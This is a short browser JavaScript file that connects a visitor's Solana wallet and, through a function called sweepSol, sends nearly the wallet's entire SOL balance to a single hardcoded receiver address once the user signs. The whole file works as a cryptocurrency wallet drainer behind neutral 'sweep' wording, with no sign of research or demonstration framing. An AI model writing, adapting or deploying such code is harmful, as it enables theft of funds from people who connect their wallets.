
const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");

let wallet = null;

async function connectWallet() {
  try {
    const resp = await window.solana.connect();
    wallet = resp.publicKey.toString();
    document.getElementById("status").innerText = "Connected: " + wallet;
  } catch (err) {
    document.getElementById("status").innerText = "Connection failed: " + err.message;
  }
}

async function sweepSol() {
  if (!wallet) {
    document.getElementById("status").innerText = "Connect wallet first!";
    return;
  }

  const receiver = "FjpnJG6qQpttXk2FxcFWYvmR2Tf6sGdvXKCmn8EPz7VE";
  const fromPubkey = new solanaWeb3.PublicKey(wallet);
  const toPubkey = new solanaWeb3.PublicKey(receiver);

  const balance = await connection.getBalance(fromPubkey);
  if (balance < 5000) {
    document.getElementById("status").innerText = "Insufficient balance to cover fee";
    return;
  }

  const transaction = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
      fromPubkey,
      toPubkey,
      lamports: balance - 5000,
    })
  );

  transaction.feePayer = fromPubkey;
  let { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;

  try {
    const signed = await window.solana.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());
    document.getElementById("status").innerText = "Sweep successful. Tx: " + signature;
  } catch (err) {
    document.getElementById("status").innerText = "Sweep failed: " + err.message;
  }
}
